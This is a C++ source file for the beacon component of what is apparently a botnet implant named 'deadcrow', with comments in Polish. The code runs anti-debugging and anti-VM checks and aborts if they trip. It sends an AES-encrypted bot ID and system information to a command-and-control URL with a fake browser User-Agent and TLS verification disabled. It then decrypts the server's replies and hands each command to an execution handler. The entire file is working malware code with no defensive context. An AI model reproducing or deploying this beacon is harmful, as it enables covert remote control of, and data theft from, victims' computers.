#include "beacon.h"
#include "../utils/anti_debug.h"
#include "../utils/aes.h"
#include <iostream>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <random>
#include <sstream>
#include <iomanip>

using json = nlohmann::json;

namespace deadcrow {
namespace core {

// Callback dla libcurl do zapisywania danych
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    std::string* response = static_cast<std::string*>(userp);
    response->append(static_cast<char*>(contents), realsize);
    return realsize;
}

Beacon::Beacon(const std::string& c2_url, const std::string& aes_key)
    : c2_url_(c2_url), aes_key_(aes_key), active_(false) {
    
    // Inicjalizacja libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[BEACON] " << status << std::endl;
        #endif
    };
    
    // Domyślny handler komend (nic nie robi)
    command_handler_ = [](const std::string&, const std::string&) {
        return true;
    };
}

Beacon::~Beacon() {
    stop();
    curl_global_cleanup();
}

bool Beacon::start(int interval_seconds) {
    std::lock_guard<std::mutex> lock(mutex_);
    
    if (active_) {
        reportStatus("Beacon już jest aktywny");
        return false;
    }
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Sprawdź, czy mamy wszystkie potrzebne dane
    if (c2_url_.empty() || aes_key_.empty() || bot_id_.empty()) {
        reportStatus("Brak wymaganych danych (URL C2, klucz AES lub ID bota)");
        return false;
    }
    
    // Ustaw flagę aktywności
    active_ = true;
    
    // Utwórz wątek beaconing
    beacon_thread_ = std::make_unique<std::thread>(&Beacon::beaconLoop, this, interval_seconds);
    
    reportStatus("Beacon uruchomiony z interwałem " + std::to_string(interval_seconds) + " sekund");
    return true;
}

void Beacon::stop() {
    std::lock_guard<std::mutex> lock(mutex_);
    
    if (!active_) {
        return;
    }
    
    // Ustaw flagę aktywności na false
    active_ = false;
    
    // Poczekaj na zakończenie wątku
    if (beacon_thread_ && beacon_thread_->joinable()) {
        beacon_thread_->join();
        beacon_thread_.reset();
    }
    
    reportStatus("Beacon zatrzymany");
}

bool Beacon::checkIn() {
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Przygotuj dane do wysłania
    json data;
    data["bot_id"] = bot_id_;
    data["system_info"] = system_info_;
    data["timestamp"] = std::chrono::system_clock::now().time_since_epoch().count();
    
    // Dodaj losowy identyfikator żądania, aby uniknąć cachowania
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 1000000);
    data["request_id"] = dis(gen);
    
    // Wyślij żądanie do C2
    std::string response = sendRequest("checkin", data.dump());
    
    // Parsuj odpowiedź
    if (!response.empty()) {
        return parseResponse(response);
    }
    
    return false;
}

void Beacon::beaconLoop(int interval_seconds) {
    while (active_) {
        // Wykonaj check-in
        bool success = checkIn();
        
        if (!success) {
            reportStatus("Check-in nie powiódł się");
        }
        
        // Czekaj określony czas, ale sprawdzaj flagę aktywności co sekundę
        for (int i = 0; i < interval_seconds && active_; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
}

std::string Beacon::sendRequest(const std::string& endpoint, const std::string& data) {
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return "";
    }
    
    try {
        // Szyfruj dane
        utils::AES aes(aes_key_);
        std::string encrypted_data = aes.encryptToBase64(data);
        
        // Przygotuj URL
        std::string url = c2_url_;
        if (url.back() != '/') {
            url += '/';
        }
        url += endpoint;
        
        // Inicjalizuj sesję CURL
        CURL* curl = curl_easy_init();
        if (!curl) {
            reportStatus("Nie udało się zainicjalizować libcurl");
            return "";
        }
        
        // Przygotuj odpowiedź
        std::string response;
        
        // Przygotuj nagłówki
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        
        // Przygotuj dane POST
        json post_data;
        post_data["data"] = encrypted_data;
        std::string post_fields = post_data.dump();
        
        // Konfiguracja żądania
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Wyłącz weryfikację SSL (w produkcji lepiej włączyć)
        
        // Wykonaj żądanie
        CURLcode res = curl_easy_perform(curl);
        
        // Zwolnij zasoby
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        
        if (res != CURLE_OK) {
            reportStatus("Błąd podczas wysyłania żądania: " + std::string(curl_easy_strerror(res)));
            return "";
        }
        
        return response;
    }
    catch (const std::exception& e) {
        reportStatus("Wyjątek podczas wysyłania żądania: " + std::string(e.what()));
        return "";
    }
}

bool Beacon::parseResponse(const std::string& response) {
    try {
        // Deszyfruj odpowiedź
        utils::AES aes(aes_key_);
        
        // Parsuj JSON
        json response_json = json::parse(response);
        
        // Sprawdź, czy odpowiedź zawiera zaszyfrowane dane
        if (!response_json.contains("data")) {
            reportStatus("Odpowiedź nie zawiera danych");
            return false;
        }
        
        // Deszyfruj dane
        std::string encrypted_data = response_json["data"];
        std::string decrypted_data = aes.decryptFromBase64(encrypted_data);
        
        // Parsuj odszyfrowane dane
        json command_json = json::parse(decrypted_data);
        
        // Sprawdź, czy mamy komendy do wykonania
        if (command_json.contains("commands") && command_json["commands"].is_array()) {
            for (const auto& cmd : command_json["commands"]) {
                if (cmd.contains("type") && cmd.contains("data")) {
                    std::string cmd_type = cmd["type"];
                    std::string cmd_data = cmd["data"];
                    
                    reportStatus("Otrzymano komendę: " + cmd_type);
                    
                    // Wykonaj komendę
                    if (command_handler_) {
                        if (!command_handler_(cmd_type, cmd_data)) {
                            reportStatus("Wykonanie komendy " + cmd_type + " nie powiodło się");
                        }
                    }
                }
            }
        }
        
        return true;
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas parsowania odpowiedzi: " + std::string(e.what()));
        return false;
    }
}

void Beacon::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Beacon::setCommandHandler(std::function<bool(const std::string&, const std::string&)> handler) {
    command_handler_ = handler;
}

bool Beacon::isActive() const {
    return active_;
}

void Beacon::setBotInfo(const std::string& bot_id, const std::string& system_info) {
    bot_id_ = bot_id;
    system_info_ = system_info;
}

void Beacon::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

bool Beacon::checkForDebugging() {
    return utils::AntiDebug::performAllChecks();
}

} // namespace core
} // namespace deadcrow
